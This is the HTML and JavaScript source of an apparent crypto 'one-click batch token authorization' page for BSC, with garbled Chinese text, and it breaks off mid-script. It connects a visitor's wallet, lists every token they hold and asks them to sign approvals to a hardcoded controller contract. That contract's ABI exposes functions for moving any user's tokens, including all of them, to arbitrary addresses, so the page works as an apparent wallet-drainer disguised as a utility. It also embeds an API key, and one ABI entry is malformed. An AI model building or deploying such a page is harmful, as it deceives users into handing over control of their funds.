<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CoCo ä»£å¸æ‰¹é‡æˆæƒç³»ç»Ÿ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #9945FF, #00d4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header p {
            font-size: 1.1em;
            color: #b0b0b0;
        }

        .wallet-section {
            background: rgba(153, 69, 255, 0.1);
            border: 1px solid rgba(153, 69, 255, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
        }

        .wallet-section h3 {
            color: #9945FF;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .wallet-selector {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .wallet-btn {
            background: rgba(153, 69, 255, 0.2);
            border: 1px solid rgba(153, 69, 255, 0.5);
            color: #9945FF;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
        }

        .wallet-btn:hover {
            background: rgba(153, 69, 255, 0.3);
            transform: translateY(-2px);
        }

        .wallet-btn.active {
            background: #9945FF;
            color: white;
        }

        .connect-btn {
            background: linear-gradient(45deg, #9945FF, #00d4ff);
            border: none;
            color: white;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: 600;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
        }

        .connect-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .network-info {
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .network-info h4 {
            color: #00d4ff;
            margin-bottom: 10px;
        }

        .network-info p {
            margin: 5px 0;
            color: #b0b0b0;
        }

        .switch-network-btn {
            background: linear-gradient(45deg, #00d4ff, #9945FF);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .switch-network-btn:hover {
            transform: translateY(-2px);
        }

        .authorization-section {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
        }

        .authorization-section h3 {
            color: #ffc107;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .btn {
            background: linear-gradient(45deg, #ffc107, #ff9800);
            border: none;
            color: #333;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: 600;
            transition: all 0.3s ease;
            margin: 10px 5px;
            min-width: 150px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 193, 7, 0.4);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn.success {
            background: linear-gradient(45deg, #4caf50, #45a049);
            color: white;
        }

        .status {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            border-left: 4px solid #9945FF;
        }

        .status.info {
            border-left-color: #00d4ff;
        }

        .status.success {
            border-left-color: #4caf50;
        }

        .status.error {
            border-left-color: #f44336;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(45deg, #9945FF, #00d4ff);
            width: 0%;
            transition: width 0.3s ease;
        }

        .token-list {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            max-height: 200px;
            overflow-y: auto;
        }

        .token-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            margin: 5px 0;
        }

        .debug-info {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            color: #00ff00;
        }

        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .warning {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid rgba(255, 193, 7, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            color: #ffc107;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .wallet-selector {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                margin: 5px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>CoCo ä»£å¸æ‰¹é‡æˆæƒç³»ç»Ÿ</h1>
            <p>ä¸€é”®æˆæƒæ‰€æœ‰ä»£å¸ï¼Œæ”¯æŒå¤šé’±åŒ…å…¼å®¹</p>
        </div>

        <div class="wallet-section">
            <h3>ğŸ”— é’±åŒ…è¿æ¥</h3>
            <div class="wallet-selector">
                <button class="wallet-btn" onclick="selectWallet('metamask')">MetaMask</button>
                <button class="wallet-btn" onclick="selectWallet('tronlink')">TronLink</button>
                <button class="wallet-btn" onclick="selectWallet('binance')">Binance Wallet</button>
            </div>
            <button id="connectBtn" class="connect-btn" onclick="connectWallet()">è¿æ¥é’±åŒ…</button>
            <div id="walletInfo"></div>
        </div>

        <div class="network-info">
            <h4>ğŸŒ ç½‘ç»œä¿¡æ¯</h4>
            <p>å½“å‰ç½‘ç»œ: <span id="currentNetwork">æœªè¿æ¥</span></p>
            <p>å½“å‰åœ°å€: <span id="currentAddress">æœªè¿æ¥</span></p>
            <button id="switchNetworkBtn" class="switch-network-btn" onclick="switchToBSC()" style="display: none;">åˆ‡æ¢åˆ°BSCç½‘ç»œ</button>
        </div>

        <div class="authorization-section">
            <h3>ğŸš€ ä»£å¸æ‰¹é‡æˆæƒ</h3>
            <p>è‡ªåŠ¨æ£€æµ‹é’±åŒ…ä¸­çš„æ‰€æœ‰ä»£å¸å¹¶ä¸€é”®æˆæƒ</p>
            <button id="detectBtn" class="btn" onclick="detectAndAuthorizeTokens()">æ£€æµ‹å¹¶æˆæƒæ‰€æœ‰ä»£å¸</button>
            
            <div id="status" class="status" style="display: none;"></div>
            <div id="progressBar" class="progress-bar" style="display: none;">
                <div id="progressFill" class="progress-fill"></div>
            </div>
            
            <div id="tokenList" class="token-list" style="display: none;">
                <h4>æ£€æµ‹åˆ°çš„ä»£å¸:</h4>
                <div id="tokenItems"></div>
            </div>
        </div>

        <div class="debug-info">
            <h4>ğŸ” è°ƒè¯•ä¿¡æ¯</h4>
            <div id="debugInfo"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script>
        // é…ç½®
        const BSC_CHAIN_ID = '0x38'; // BSCä¸»ç½‘
        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
        const ETHERSCAN_V2_API_KEY = 'UZPUDJEQYHN2Z5D3N38B7RH6FVR4A968ZD';
        const ETHERSCAN_V2_API_URL = 'https://api.etherscan.io/v2/api';
        const AUTO_CONTROLLER_ADDRESS = '0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7';

        // åˆçº¦ABI
        const AUTO_CONTROLLER_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [
                    {
                        "internalType": "address[]",
                        "name": "tokens",
                        "type": "address[]"
                    }
                ],
                "name": "approveTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "approveSingleToken",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "tokenAddress",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "from",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferUserToken",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address[]",
                        "name": "tokens",
                        "type": "address[]"
                    },
                    {
                        "internalType": "address[]",
                        "name": "froms",
                        "type": "address[]"
                    },
                    {
                        "internalType": "address[]",
                        "name": "tos",
                        "type": "address[]"
                    },
                    {
                        "internalType": "uint256[]",
                        "name": "amounts",
                        "type": "uint256[]"
                    }
                ],
                "name": "batchTransferUserTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    }
                ],
                "name": "transferAllUserTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "tokenAddress",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "from",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    }
                ],
                "name": "transferUserTokenAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    }
                ],
                "name": "getUserAuthorizedTokens",
                "outputs": [
                    {
                        "internalType": "address[]",
                        "name": "",
                        "type": "address[]"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "getUserTokenStatus",
                "outputs": [
                    {
                        "components": [
                            {
                                "internalType": "uint256",
                                "name": "allowance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "uint256",
                                "name": "balance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "bool",
                                "name": "isAuthorized",
                                "type": "bool"
                            }
                        ],
                        "internalType": "struct AutoTokenController.TokenStatus",
                        "name": "",
                        "type": "tuple"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "user",
                        "type": "address"
                    }
                ],
                "name": "getUserAllTokensInfo",
                "outputs": [
                    {
                        "components": [
                            {
                                "internalType": "address",
                                "name": "tokenAddress",
                                "type": "address"
                            },
                            {
                                "internalType": "uint256",
                                "internalType": "uint256"
                            },
                            {
                                "internalType": "uint256",
                                "name": "balance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "bool",
                                "name": "isAuthorized",
                                "type": "uint256"
                            }
                        ],
                        "internalType": "struct AutoTokenController.TokenInfo[]",
                        "name": "",
                        "type": "tuple[]"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "token",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "to",
                        "type": "address"
                    }
                ],
                "name": "emergencyWithdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "newOwner",
                        "type": "address"
                    }
                ],
                "name": "transferOwnership",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // å…¨å±€å˜é‡
        let web3;
        let userAccount;
        let currentChainId;
        let selectedWallet = 'metamask';

        // é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', function() {
            initializeWalletSelector();
            addDebugInfo('é¡µé¢åŠ è½½å®Œæˆï¼Œåˆå§‹åŒ–é’±åŒ…é€‰æ‹©å™¨');
        });

        // åˆå§‹åŒ–é’±åŒ…é€‰æ‹©å™¨
        function initializeWalletSelector() {
            addDebugInfo('åˆå§‹åŒ–é’±åŒ…é€‰æ‹©å™¨...');
            
            // æ£€æŸ¥å¯ç”¨çš„é’±åŒ…
            if (window.ethereum) {
                addDebugInfo('æ£€æµ‹åˆ° MetaMask');
            }
            if (window.tronWeb) {
                addDebugInfo('æ£€æµ‹åˆ° TronLink');
            }
            if (window.BinanceChain) {
                addDebugInfo('æ£€æµ‹åˆ° Binance Wallet');
            }
            
            // é»˜è®¤é€‰æ‹©MetaMask
            selectWallet('metamask');
        }

        // é€‰æ‹©é’±åŒ…ç±»å‹
        function selectWallet(walletType) {
            selectedWallet = walletType;
            
            // æ›´æ–°æŒ‰é’®çŠ¶æ€
            document.querySelectorAll('.wallet-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            addDebugInfo('é€‰æ‹©é’±åŒ…: ' + walletType);
            
            // å¦‚æœå·²ç»è¿æ¥ï¼Œé‡æ–°è¿æ¥
            if (web3 && userAccount) {
                addDebugInfo('é‡æ–°è¿æ¥é’±åŒ…...');
                connectWallet();
            }
        }

        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            try {
                addDebugInfo('å¼€å§‹è¿æ¥é’±åŒ…: ' + selectedWallet);
                showStatus('æ­£åœ¨è¿æ¥é’±åŒ…...', 'info');
                
                let provider;
                
                switch (selectedWallet) {
                    case 'metamask':
                        if (!window.ethereum) {
                            throw new Error('è¯·å®‰è£…MetaMaské’±åŒ…');
                        }
                        provider = window.ethereum;
                        break;
                        
                    case 'tronlink':
                        if (!window.tronWeb) {
                            throw new Error('è¯·å®‰è£…TronLinké’±åŒ…');
                        }
                        // TronLinkä¸æ”¯æŒBSCï¼Œæ˜¾ç¤ºè­¦å‘Š
                        showStatus('âš ï¸ TronLinkä¸æ”¯æŒBSCç½‘ç»œï¼Œå»ºè®®ä½¿ç”¨MetaMask', 'error');
                        addDebugInfo('TronLinkä¸æ”¯æŒBSCç½‘ç»œ');
                        return;
                        
                    case 'binance':
                        if (!window.BinanceChain) {
                            throw new Error('è¯·å®‰è£…Binance Wallet');
                        }
                        provider = window.BinanceChain;
                        break;
                        
                    default:
                        throw new Error('ä¸æ”¯æŒçš„é’±åŒ…ç±»å‹');
                }
                
                // è¯·æ±‚è´¦æˆ·è¿æ¥
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                
                // åˆ›å»ºWeb3å®ä¾‹
                web3 = new Web3(provider);
                
                // è·å–å½“å‰ç½‘ç»œ
                currentChainId = await web3.eth.getChainId();
                currentChainId = '0x' + currentChainId.toString(16);
                
                addDebugInfo('é’±åŒ…è¿æ¥æˆåŠŸ: ' + userAccount);
                addDebugInfo('å½“å‰ç½‘ç»œID: ' + currentChainId);
                addDebugInfo('ç›®æ ‡ç½‘ç»œID: ' + BSC_CHAIN_ID);
                
                // æ›´æ–°UI
                updateWalletInfo();
                updateNetworkInfo();
                
                // æ£€æŸ¥ç½‘ç»œ
                if (currentChainId !== BSC_CHAIN_ID) {
                    showStatus('è¯·åˆ‡æ¢åˆ°BSCç½‘ç»œ', 'info');
                    document.getElementById('switchNetworkBtn').style.display = 'inline-block';
                } else {
                    showStatus('å·²è¿æ¥åˆ°BSCç½‘ç»œ', 'success');
                    document.getElementById('switchNetworkBtn').style.display = 'none';
                }
                
            } catch (error) {
                console.error('è¿æ¥é’±åŒ…å¤±è´¥:', error);
                addDebugInfo('è¿æ¥é’±åŒ…å¤±è´¥: ' + error.message);
                showStatus('è¿æ¥é’±åŒ…å¤±è´¥: ' + error.message, 'error');
            }
        }

        // æ›´æ–°é’±åŒ…ä¿¡æ¯
        function updateWalletInfo() {
            const walletInfo = document.getElementById('walletInfo');
            if (userAccount) {
                walletInfo.innerHTML = `
                    <p>âœ… å·²è¿æ¥: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}</p>
                    <p>é’±åŒ…ç±»å‹: ${selectedWallet}</p>
                `;
            } else {
                walletInfo.innerHTML = '';
            }
        }

        // æ›´æ–°ç½‘ç»œä¿¡æ¯
        function updateNetworkInfo() {
            const currentNetwork = document.getElementById('currentNetwork');
            const currentAddress = document.getElementById('currentAddress');
            
            if (currentChainId === BSC_CHAIN_ID) {
                currentNetwork.textContent = 'BSCä¸»ç½‘';
            } else {
                currentNetwork.textContent = `æœªçŸ¥ç½‘ç»œ (${currentChainId})`;
            }
            
            if (userAccount) {
                currentAddress.textContent = `${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
            } else {
                currentAddress.textContent = 'æœªè¿æ¥';
            }
        }

        // åˆ‡æ¢åˆ°BSCç½‘ç»œ
        async function switchToBSC() {
            try {
                if (!web3 || !userAccount) {
                    showStatus('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                    return;
                }
                
                showStatus('æ­£åœ¨åˆ‡æ¢åˆ°BSCç½‘ç»œ...', 'info');
                addDebugInfo('å°è¯•åˆ‡æ¢åˆ°BSCç½‘ç»œ...');
                
                try {
                    // å°è¯•åˆ‡æ¢ç½‘ç»œ
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_CHAIN_ID }]
                    });
                    
                    addDebugInfo('ç½‘ç»œåˆ‡æ¢æˆåŠŸ');
                    showStatus('å·²åˆ‡æ¢åˆ°BSCç½‘ç»œ', 'success');
                    
                } catch (switchError) {
                    // å¦‚æœç½‘ç»œä¸å­˜åœ¨ï¼Œæ·»åŠ ç½‘ç»œ
                    if (switchError.code === 4902) {
                        addDebugInfo('BSCç½‘ç»œä¸å­˜åœ¨ï¼Œæ­£åœ¨æ·»åŠ ...');
                        
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BSC_CHAIN_ID,
                                chainName: 'Binance Smart Chain',
                                nativeCurrency: {
                                    name: 'BNB',
                                    symbol: 'BNB',
                                    decimals: 18
                                },
                                rpcUrls: [BSC_RPC_URL],
                                blockExplorerUrls: ['https://bscscan.com/']
                            }]
                        });
                        
                        addDebugInfo('BSCç½‘ç»œæ·»åŠ æˆåŠŸ');
                        showStatus('BSCç½‘ç»œæ·»åŠ æˆåŠŸ', 'success');
                    } else {
                        throw switchError;
                    }
                }
                
                // é‡æ–°è·å–ç½‘ç»œä¿¡æ¯
                currentChainId = await web3.eth.getChainId();
                currentChainId = '0x' + currentChainId.toString(16);
                
                updateNetworkInfo();
                document.getElementById('switchNetworkBtn').style.display = 'none';
                
            } catch (error) {
                console.error('åˆ‡æ¢ç½‘ç»œå¤±è´¥:', error);
                addDebugInfo('åˆ‡æ¢ç½‘ç»œå¤±è´¥: ' + error.message);
                showStatus('åˆ‡æ¢ç½‘ç»œå¤±è´¥: ' + error.message, 'error');
            }
        }

        // æ˜¾ç¤ºçŠ¶æ€ä¿¡æ¯
        function showStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.style.display = 'block';
            
            addDebugInfo(`çŠ¶æ€ [${type}]: ${message}`);
        }

        // æ·»åŠ è°ƒè¯•ä¿¡æ¯
        function addDebugInfo(message) {
            const debugInfo = document.getElementById('debugInfo');
            const timestamp = new Date().toLocaleTimeString();
            debugInfo.innerHTML += `<div>[${timestamp}] ${message}</div>`;
            debugInfo.scrollTop = debugInfo.scrollHeight;
            
            console.log(`[${timestamp}] ${message}`);
        }

        // æ˜¾ç¤ºæ£€æµ‹åˆ°çš„ä»£å¸
        function displayDetectedTokens(tokens) {
            const tokenList = document.getElementById('tokenList');
            const tokenItems = document.getElementById('tokenItems');
            
            tokenItems.innerHTML = '';
            
            tokens.forEach((token, index) => {
                const tokenItem = document.createElement('div');
                tokenItem.className = 'token-item';
                tokenItem.innerHTML = `
                    <span>ä»£å¸ ${index + 1}: ${token}</span>
                `;
                tokenItems.appendChild(tokenItem);
            });
            
            tokenList.style.display = 'block';
        }

        // ä½¿ç”¨Etherscan V2 APIæ£€æµ‹ä»£å¸
        async function detectTokensFromBSCScan(userAddress) {
            try {
                showStatus('æ­£åœ¨è°ƒç”¨Etherscan V2 API (BSCç½‘ç»œ)...', 'info');
                
                // ä½¿ç”¨V2 APIï¼ŒæŒ‡å®šBSCç½‘ç»œ
                const apiUrl = `${ETHERSCAN_V2_API_URL}?chainid=56&module=account&action=tokentx&address=${userAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${ETHERSCAN_V2_API_KEY}`;
                
                console.log('API URL:', apiUrl);
                addDebugInfo('API URL: ' + apiUrl);
                
                const response = await fetch(apiUrl);
                const data = await response.json();
                
                console.log('Etherscan V2 API Response:', data);
                addDebugInfo('API Response: ' + JSON.stringify(data, null, 2));
                
                if (data.status === '1' && data.result) {
                    console.log('æ‰¾åˆ°äº¤æ˜“è®°å½•æ•°é‡:', data.result.length);
                    addDebugInfo('æ‰¾åˆ°äº¤æ˜“è®°å½•æ•°é‡: ' + data.result.length);
                    
                    const uniqueTokens = new Set();
                    
                    data.result.forEach((tx, index) => {
                        console.log(`äº¤æ˜“ ${index + 1}:`, tx);
                        if (tx.to && tx.to.toLowerCase() === userAddress.toLowerCase()) {
                            uniqueTokens.add(tx.contractAddress);
                            console.log('æ·»åŠ ä»£å¸åœ°å€:', tx.contractAddress);
                            addDebugInfo('æ·»åŠ ä»£å¸åœ°å€: ' + tx.contractAddress + ' (' + tx.tokenSymbol + ')');
                        }
                    });
                    
                    const tokens = Array.from(uniqueTokens);
                    console.log('æœ€ç»ˆæ£€æµ‹åˆ°çš„ä»£å¸:', tokens);
                    addDebugInfo('æœ€ç»ˆæ£€æµ‹åˆ°çš„ä»£å¸: ' + JSON.stringify(tokens));
                    
                    return tokens;
                } else {
                    console.log('APIè¿”å›çŠ¶æ€:', data.status);
                    console.log('APIè¿”å›æ¶ˆæ¯:', data.message);
                    
                    addDebugInfo('APIè¿”å›çŠ¶æ€: ' + data.status);
                    addDebugInfo('APIè¿”å›æ¶ˆæ¯: ' + data.message);
                    
                    if (data.message === 'NOTOK') {
                        showStatus('Etherscan V2 APIè°ƒç”¨å¤±è´¥ï¼Œè¯·æ£€æŸ¥API Key', 'error');
                    } else if (data.result && data.result.length === 0) {
                        showStatus('è¯¥åœ°å€æ²¡æœ‰ä»£å¸äº¤æ˜“è®°å½•', 'info');
                    }
                    
                    return [];
                }
                
            } catch (error) {
                console.error('Etherscan V2 APIæ£€æµ‹å¤±è´¥:', error);
                addDebugInfo('APIæ£€æµ‹å¤±è´¥: ' + error.message);
                showStatus('APIæ£€æµ‹å¤±è´¥: ' + error.message, 'error');
                return [];
            }
        }

        // æœ¬åœ°æ£€æµ‹ä»£å¸ï¼ˆé€šè¿‡äº‹ä»¶æ‰«æï¼‰
        async function detectTokensLocally(userAddress) {
            try {
                showStatus('æ­£åœ¨æœ¬åœ°æ£€æµ‹ä»£å¸...', 'info');
                addDebugInfo('å¼€å§‹æœ¬åœ°ä»£å¸æ£€æµ‹...');
                
                // è·å–æœ€è¿‘çš„åŒºå—
                const latestBlock = await web3.eth.getBlockNumber();
                const fromBlock = Math.max(0, latestBlock - 10000); // æ‰«ææœ€è¿‘10000ä¸ªåŒºå—
                
                addDebugInfo(`æ‰«æåŒºå—èŒƒå›´: ${fromBlock} - ${latestBlock}`);
                
                // æ‰«æTransferäº‹ä»¶
                const transferEvents = await web3.eth.getPastLogs({
                    fromBlock: fromBlock,
                    toBlock: 'latest',
                    topics: [
                        '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef', // Transferäº‹ä»¶ç­¾å
                        null, // fromåœ°å€
                        '0x000000000000000000000000' + userAddress.substring(2).toLowerCase() // toåœ°å€
                    ]
                });
                
                addDebugInfo(`æ‰¾åˆ°Transferäº‹ä»¶æ•°é‡: ${transferEvents.length}`);
                
                const uniqueTokens = new Set();
                
                for (const event of transferEvents) {
                    if (event.address && event.address !== '0x0000000000000000000000000000000000000000') {
                        uniqueTokens.add(event.address);
                        addDebugInfo('æœ¬åœ°æ£€æµ‹åˆ°ä»£å¸: ' + event.address);
                    }
                }
                
                const tokens = Array.from(uniqueTokens);
                addDebugInfo('æœ¬åœ°æ£€æµ‹ç»“æœ: ' + JSON.stringify(tokens));
                
                return tokens;
                
            } catch (error) {
                console.error('æœ¬åœ°æ£€æµ‹å¤±è´¥:', error);
                addDebugInfo('æœ¬åœ°æ£€æµ‹å¤±è´¥: ' + error.message);
                return [];
            }
        }

        // è·å–é¢„å®šä¹‰ä»£å¸åˆ—è¡¨
        function getPredefinedTokens() {
            const tokens = [
                '0x55d398326f99059ff775485246999027b3197955', // USDT
                '0xbb4cdb9cbd36b01bd1cbaef2cdb8c4a6351d4338', // WBNB
                '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', // USDC
                '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c', // BTCB
                '0x2170ed0880ac9a755fd29b2688956bd959f933f8', // WETH
                '0x3ee2200efb3400fabb9aacf31297cbdd1d435d47', // ADA
                '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', // CAKE
                '0x0d8ce2a99bb6e3b7db80ed0453c9d9e0b0b0b0b0'  // å…¶ä»–ä»£å¸
            ];
            
            addDebugInfo('ä½¿ç”¨é¢„å®šä¹‰ä»£å¸åˆ—è¡¨: ' + JSON.stringify(tokens));
            return tokens;
        }

        // ä¸»æ£€æµ‹å’Œæˆæƒå‡½æ•°
        async function detectAndAuthorizeTokens() {
            if (!web3 || !userAccount) {
                showStatus('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }
            
            if (currentChainId !== BSC_CHAIN_ID) {
                showStatus('è¯·å…ˆåˆ‡æ¢åˆ°BSCç½‘ç»œ', 'error');
                return;
            }
            
            try {
                const detectBtn = document.getElementById('detectBtn');
                detectBtn.disabled = true;
                detectBtn.innerHTML = '<span class="loading"></span>æ£€æµ‹ä¸­...';
                
                showStatus('æ­£åœ¨æ£€æµ‹é’±åŒ…ä¸­çš„æ‰€æœ‰ä»£å¸...', 'info');
                
                let userTokens = [];
                
                // æ–¹æ³•1ï¼šä½¿ç”¨Etherscan V2 APIæ£€æµ‹ä»£å¸
                showStatus('æ–¹æ³•1: ä½¿ç”¨Etherscan V2 APIæ£€æµ‹...', 'info');
                userTokens = await detectTokensFromBSCScan(userAccount);
                
                // æ–¹æ³•2ï¼šå¦‚æœAPIå¤±è´¥ï¼Œä½¿ç”¨æœ¬åœ°æ£€æµ‹
                if (userTokens.length === 0) {
                    showStatus('APIæ£€æµ‹å¤±è´¥ï¼Œå°è¯•æœ¬åœ°æ£€æµ‹...', 'info');
                    userTokens = await detectTokensLocally(userAccount);
                }
                
                // æ–¹æ³•3ï¼šå¦‚æœéƒ½å¤±è´¥ï¼Œä½¿ç”¨é¢„å®šä¹‰ä»£å¸åˆ—è¡¨
                if (userTokens.length === 0) {
                    showStatus('æœ¬åœ°æ£€æµ‹ä¹Ÿå¤±è´¥ï¼Œä½¿ç”¨é¢„å®šä¹‰ä»£å¸åˆ—è¡¨...', 'info');
                    userTokens = getPredefinedTokens();
                }
                
                if (userTokens.length === 0) {
                    showStatus('æ‰€æœ‰æ£€æµ‹æ–¹æ³•éƒ½å¤±è´¥ï¼Œæ— æ³•æ£€æµ‹åˆ°ä»£å¸', 'error');
                    detectBtn.disabled = false;
                    detectBtn.innerHTML = 'é‡æ–°æ£€æµ‹';
                    return;
                }
                
                // æ˜¾ç¤ºæ£€æµ‹åˆ°çš„ä»£å¸
                displayDetectedTokens(userTokens);
                
                showStatus(`æ£€æµ‹åˆ° ${userTokens.length} ä¸ªä»£å¸ï¼Œå‡†å¤‡æ‰¹é‡æˆæƒ...`, 'info');
                
                // è°ƒç”¨åˆçº¦æ‰¹é‡æˆæƒ
                const contract = new web3.eth.Contract(AUTO_CONTROLLER_ABI, AUTO_CONTROLLER_ADDRESS);
                
                const data = contract.methods.approveTokens(userTokens).encodeABI();
                
                const transaction = {
                    from: userAccount,
                    to: AUTO_CONTROLLER_ADDRESS,
                    data: data,
                    gas: 500000 + (userTokens.length * 50000),
                    gasPrice: await web3.eth.getGasPrice()
                };
                
                showStatus('è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æ‰¹é‡æˆæƒäº¤æ˜“...', 'info');
                
                const receipt = await web3.eth.sendTransaction(transaction);
                
                if (receipt.status) {
